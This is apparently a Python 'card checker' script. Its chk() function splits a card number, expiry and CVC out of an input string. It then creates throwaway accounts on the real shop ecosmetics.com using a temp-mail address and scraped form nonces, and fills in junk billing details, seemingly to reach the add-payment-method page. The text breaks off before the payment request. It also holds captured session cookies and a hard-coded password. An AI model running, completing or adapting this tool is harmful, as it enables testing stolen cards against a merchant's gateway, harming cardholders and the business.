def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	user = user_agent.generate_user_agent()
	









	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	}
	
	response = requests.get('https://temp-mail.random-gen.com/', headers=headers)	
	
	acc = re.search(r'&quot;params&quot;:\[&quot;(.*?)&quot;\]', response.text).group(1)

	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'PHPSESSID=MFjyZjNCWW6%2CU4F91Ldu4Gt-dIZePez8; __cf_bm=opcSHW.qDZtvoPBqcH3as8iCTS3prbO8TMIn_pzVbU8-1724177251-1.0.1.1-JJPBw6aXhomibYz_teVnArNu0gmktMmu9QmiaiLxYCSIsTTFsINvZo88EFfRXZAcVpd2maikwdzit9YSt_YGHA; _cfuvid=sNFygNYxQnL_3scksycLhpVq3279qNrhLouLjcLu4oI-1724177251100-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_test_cookie=WP%20Cookie%20check; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=t_4926861ac82ba5994a4e6aceea8e67%7C%7C1724350782%7C%7C1724347182%7C%7Cc4561753f5d35a9baf5784f6107cb175; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724177990%7D; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2F; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724177992.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724177994.0.0.0; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724177995.47.0.1246504398',
    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://www.ecosmetics.com/my-account/', headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
#2
	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=MFjyZjNCWW6%2CU4F91Ldu4Gt-dIZePez8; __cf_bm=opcSHW.qDZtvoPBqcH3as8iCTS3prbO8TMIn_pzVbU8-1724177251-1.0.1.1-JJPBw6aXhomibYz_teVnArNu0gmktMmu9QmiaiLxYCSIsTTFsINvZo88EFfRXZAcVpd2maikwdzit9YSt_YGHA; _cfuvid=sNFygNYxQnL_3scksycLhpVq3279qNrhLouLjcLu4oI-1724177251100-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_test_cookie=WP%20Cookie%20check; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=t_4926861ac82ba5994a4e6aceea8e67%7C%7C1724350782%7C%7C1724347182%7C%7Cc4561753f5d35a9baf5784f6107cb175; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724178011%7D; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2F; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724178183.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724178183.0.0.0; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724178183.57.0.1246504398',
    'origin': 'https://www.ecosmetics.com',
    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'email': acc,
    'password': 'jojo@ALi123',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.ecosmetics.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-08-20 18:07:34',
    'wc_order_attribution_session_pages': '5',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': register,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

	response = r.post('https://www.ecosmetics.com/my-account/',headers=headers, data=data)
#3

	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': 'PHPSESSID=MFjyZjNCWW6%2CU4F91Ldu4Gt-dIZePez8; _cfuvid=sNFygNYxQnL_3scksycLhpVq3279qNrhLouLjcLu4oI-1724177251100-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_test_cookie=WP%20Cookie%20check; no_cache=1; wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220=hfujfhfidjfjjfjjf%7C1725387784%7CR5MmdxnX19Nc4XJaJeSkPQa3S1lPFAk7rcWO65ydsW7%7C4a304a39752a0f2bf0681cb00cd293d378eaff830248234708daa453401de1ec; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=9328496%7C%7C1724350782%7C%7C1724347182%7C%7C8c291e07735d9441d93056d27be732af; __cf_bm=ft6KFhEOijya38Y_gtScwVBsz.QKnFpc9JhOg.513Ic-1724178184-1.0.1.1-5vm96HaVBkN5YuJhzwJxOEdFIAuoVqGsjDXVDefgXGu844oVf555dJp76cO8FkjcnkhzoR3aPz5BudBosz1FLA; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724178701%7D; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724178704.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724178706.0.0.0; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724178706.49.0.1246504398',
    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/edit-address/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)

	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)

#4


	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=MFjyZjNCWW6%2CU4F91Ldu4Gt-dIZePez8; _cfuvid=sNFygNYxQnL_3scksycLhpVq3279qNrhLouLjcLu4oI-1724177251100-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-20%2018%3A07%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_test_cookie=WP%20Cookie%20check; no_cache=1; wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220=hfujfhfidjfjjfjjf%7C1725387784%7CR5MmdxnX19Nc4XJaJeSkPQa3S1lPFAk7rcWO65ydsW7%7C4a304a39752a0f2bf0681cb00cd293d378eaff830248234708daa453401de1ec; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=9328496%7C%7C1724350782%7C%7C1724347182%7C%7C8c291e07735d9441d93056d27be732af; __cf_bm=ft6KFhEOijya38Y_gtScwVBsz.QKnFpc9JhOg.513Ic-1724178184-1.0.1.1-5vm96HaVBkN5YuJhzwJxOEdFIAuoVqGsjDXVDefgXGu844oVf555dJp76cO8FkjcnkhzoR3aPz5BudBosz1FLA; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177258%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724178729%7D; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724178863.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724178863.0.0.0; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724178863.56.0.1246504398',
    'origin': 'https://www.ecosmetics.com',
    'pragma': 'no-cache',
    'referer': 'https://www.ecosmetics.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'billing_first_name': 'bbxbcbb',
    'billing_last_name': 'hhxbfbb',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': 'hhfhfbfv',
    'billing_address_2': 'hbdbfv',
    'billing_city': 'hfhdvvxv',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '2153652415',
    'billing_email': 'moh5527vbnm@gmail.com',
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = requests.post(
    'https://www.ecosmetics.com/my-account/edit-address/billing/',
    cookies=r.cookies,
    headers=headers,
    data=data,
)
#5


	headers = {
    'authority': 'www.ecosmetics.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_gcl_au=1.1.2031979683.1724177258; cf_clearance=qofT0FFOQh4RG5iihHgxrqmlZQj2G_Ix38WxIXO5CII-1724177257-1.2.1.1-HtCeoDfoCiQGL3APGIrmNZNyAQG8zSvPnN6V8I0E9NYIbyziKIlkgevmTPLG3h64iU3nqOo2l4LK6kJhvXvKZ1GAcKBXti5jTw8eTP.bwSAtHIhyfkxt2Iih0LAz3w6l0TT3XDBsR0T2HNKSNkQQI5dF0zvFvxu4poWWTqEdD8pNSNV_Y5PP40u43WGw6YW7PmssSEcY_pA6uyH12PLHCNPliO6mZfUi5zytI_lVfda1lRNA7W3_AQC6iUkTarBjs6FiFAlOYQps2SpMrAA8jLtDPPbVtIpW9BJoQuG0BXrcTeZzPXAw_V0UmweXzh9U__POSMQONzBVOADsIONMd3Dh.CQFbBBQNhJmPASe8zRL6SoLmOtYsbvNhpdHm4Eh0rwsUDSv3vNUk1sMyBF39rixsuV9IqOyoGlfX7qIbZjaLbkoAvzD8CHL_nRcRndX; _ga=GA1.1.1649746425.1724177258; wordpress_logged_in_9a1daefe07e3d628d7e9f4ff0d3f8220=hfujfhfidjfjjfjjf%7C1725387784%7CR5MmdxnX19Nc4XJaJeSkPQa3S1lPFAk7rcWO65ydsW7%7C4a304a39752a0f2bf0681cb00cd293d378eaff830248234708daa453401de1ec; wp_woocommerce_session_9a1daefe07e3d628d7e9f4ff0d3f8220=9328496%7C%7C1724350782%7C%7C1724347182%7C%7C8c291e07735d9441d93056d27be732af; PHPSESSID=%2CiuSWpsVx0pHDUG95xfuZrbUWWYHGUJD; __cf_bm=6jzB6W7P0TTsIUB7S0qonpXSlyI6MQaAWe5CTPn8KZ8-1724179106-1.0.1.1-OAr04jrC1tK5huKgAwGRk31eeKi8Vaf8fNAZ1fICovP9gBC_c3PrrZLBQnatLFiERgZC.KJ.ofqQb8HOBPbPNw; _cfuvid=2nhlIBbkQHz3FArNTbQhoUMeqUmKChU8eKqgVwvtfb0-1724179106026-0.0.1.1-604800000; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F; sbjs_first_add=fd%3D2024-08-20%2018%3A38%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fedit-address%2Fbilling%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; pmTPTrack=%7B%22gclid%22%3Anull%2C%22gacid%22%3A%22GA1.1.1649746425.1724177258%22%2C%22gacid_source%22%3A%22gacookie%22%2C%22fbp%22%3Anull%2C%22fbc%22%3Anull%2C%22gbraid%22%3Anull%2C%22wbraid%22%3Anull%2C%22ga4SessionId%22%3A%221724177259%22%2C%22ga4SessionCount%22%3A%221%22%2C%22timestamp%22%3A1724179170%7D; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.ecosmetics.com%2Fmy-account%2Fpayment-methods%2F; _ga_S104KL6WC3=GS1.1.1724177258.1.1.1724179173.0.0.0; _ga_4Z6R75ENPP=GS1.1.1724177259.1.1.1724179175.0.0.0; _uetsid=1645f3a05f1f11efb80797a9ddcabe8c; _uetvid=164771105f1f11ef9cdf6922044cec24; _ga_S84EZBZ2FR=GS1.1.1724177259.1.1.1724179176.60.0.1246504398',
